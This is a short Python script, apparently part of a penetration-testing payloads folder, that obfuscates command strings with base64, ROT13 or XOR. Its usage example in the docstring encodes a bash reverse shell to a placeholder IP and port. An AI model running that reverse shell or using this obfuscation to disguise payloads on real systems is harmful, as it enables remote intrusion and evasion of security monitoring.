#!/usr/bin/env python3
"""
obfuscate_cmd.py - Simple command obfuscator (base64 / rot13 / xor)

Example:
  python3 scripts/payloads/obfuscate_cmd.py --cmd "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" --method base64
"""
from __future__ import annotations
import argparse
import base64
import sys

GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
NC = "\033[0m"


def rot13(s: str) -> str:
    return s.encode('rot_13') if False else __import__('codecs').encode(s, 'rot_13')


def xor_bytes(s: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in s])


def main() -> int:
    p = argparse.ArgumentParser(description='Obfuscate a command string')
    p.add_argument('--cmd', required=True)
    p.add_argument('--method', choices=('base64', 'rot13', 'xor'), default='base64')
    p.add_argument('--xor-key', type=int, default=23)
    args = p.parse_args()

    if args.method == 'base64':
        enc = base64.b64encode(args.cmd.encode()).decode()
        print(f"{GREEN}Base64:{NC} {enc}", flush=True)
    elif args.method == 'rot13':
        try:
            enc = rot13(args.cmd)
            print(f"{GREEN}ROT13:{NC} {enc}", flush=True)
        except Exception as e:
            print(f"{RED}[!] rot13 failed:{NC} {e}", flush=True)
            return 2
    elif args.method == 'xor':
        xb = xor_bytes(args.cmd.encode(), args.xor_key)
        print(f"{GREEN}XOR (hex):{NC} {xb.hex()}", flush=True)
    return 0


if __name__ == '__main__':
    sys.exit(main())
